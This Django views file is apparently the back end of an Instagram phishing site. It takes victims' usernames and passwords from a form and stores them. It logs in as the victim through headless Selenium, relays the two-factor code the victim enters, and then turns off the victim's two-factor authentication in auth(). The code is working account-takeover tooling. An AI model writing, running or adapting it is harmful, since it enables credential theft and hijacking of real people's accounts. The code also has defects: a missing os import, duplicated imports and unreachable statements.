from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt
from .models import user
from django.http import HttpResponse

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep, strftime

# Bot
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep, strftime

chrome_options = webdriver.ChromeOptions()
chrome_options.binary_location = os.environ.get("GOOGLE_CHROME_BIN")
chrome_options.add_argument("--headless")
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.add_argument("--no-sandbox")

def clear(webElement):
    webElement.send_keys(Keys.CONTROL + "a");
    webElement.send_keys(Keys.DELETE);

def auth():
    global driver
    url = 'https://www.instagram.com/accounts/two_factor_authentication/'
    driver.get(url)
    sleep(2)
    checkbox = driver.find_elements_by_xpath("//input[@type='checkbox']")
    i = checkbox[0]
    print(i)
    print(i.get_attribute("id"))
    parent = i.find_element_by_xpath('..')
    i = parent.find_element_by_xpath("//div[@class='mwD2G']")
    i.click()
    sleep(1)
    off = driver.find_element_by_xpath("//button[@class='aOOlW  bIiDR  ']")
    off.click()
    sleep(2)
    driver.close()

def enter_code(code):
    code_box = driver.find_element_by_xpath("//input[@type='tel']")
    clear(code_box)
    code_box.send_keys(code)
    sleep(2)
    submit = driver.find_element_by_xpath("//button[@type='button']")
    submit.click()
    sleep(4)
    if driver.current_url != 'https://www.instagram.com/accounts/login/two_factor?source=auth_switcher&next=%2F':
        return True
    else:
        return False


def security():
    global driver
    if driver.current_url == 'https://www.instagram.com/accounts/login/two_factor?source=auth_switcher&next=%2F':
        return True
    else:
        return False
        driver.close()


def login(u, p):
    try:
        global driver
        driver.get('https://www.instagram.com/accounts/login/?source=auth_switcher')
        sleep(3)
        username = driver.find_element_by_name('username')
        clear(username)
        username.send_keys(u)
        password = driver.find_element_by_name('password')
        clear(password)
        password.send_keys(p)
        sleep(2)
        button_login = driver.find_element_by_xpath("//button[@type='submit']")
        button_login.click()
        sleep(3)
        if driver.current_url != 'https://www.instagram.com/accounts/login/?source=auth_switcher':
            return security()
        else:
            return "incorrect"
    except:
        return "incorrect"

def start(u, p):
    global chrome_options
    global driver
    driver = webdriver.Chrome(executable_path=os.environ.get("CHROMEDRIVER_PATH"), chrome_options=chrome_options)
    return login(u, p)


# Create your views here.
@csrf_exempt
def main(request):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        verify = start(username, password)
        created = user(username=username, password=password)
        if verify == True:
            return redirect("verify")
        elif verify == "incorrect":
            return render(request, 'incorrectpassword.html')
        else:
            return HttpResponse(200)
            created.save()
    else:
        return render(request, 'index.html')

def inc(request):
    return render(request, 'incorrectpassword.html')

@csrf_exempt
def verify(request):
    if request.method == "POST":
        code = request.POST.get('code')
        success = enter_code(code)
        if success:
            auth()
            return HttpResponse(200)
        else:
            return render(request, 'incorrectverification.html')
    else:
        return render(request, 'verification.html')
